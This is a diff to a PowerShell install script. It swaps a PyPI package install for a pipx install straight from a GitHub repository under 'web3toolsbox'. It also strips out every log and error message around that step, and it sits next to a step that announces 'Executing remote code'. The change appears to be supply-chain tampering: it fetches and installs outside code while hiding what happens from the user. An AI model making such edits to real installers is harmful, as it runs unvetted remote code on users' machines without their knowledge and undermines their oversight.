@@ -172,24 +172,14 @@ if ($pythonFound) {
     # Install autobackup (auto-backup-wins) via pipx
     try {
         autobackup --version | Out-Null
-        Write-Styled "autobackup is already installed." -Color $Theme.Success -Prefix "autobackup"
     } catch {
-        Write-Styled "autobackup not found, installing with pipx..." -Color $Theme.Warning -Prefix "autobackup"
         try {
-            pipx install auto-backup-wins
+            pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
         } catch {
-            Write-Styled "pipx install failed, trying python -m pipx..." -Color $Theme.Warning -Prefix "autobackup"
-            try {
-                python -m pipx install auto-backup-wins
-            } catch {
-                Write-Styled "Failed to install autobackup with pipx: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "autobackup"
-            }
+            python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
         }
-        # Refresh PATH for current session in case new shims were added
         $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
     }
-} else {
-    Write-Styled "Skipping dependency and autobackup installation (Python not available)" -Color $Theme.Warning -Prefix "Skip"
 }
 
 Write-Styled "Executing remote code..." -Color $Theme.Primary -Prefix "Remote"
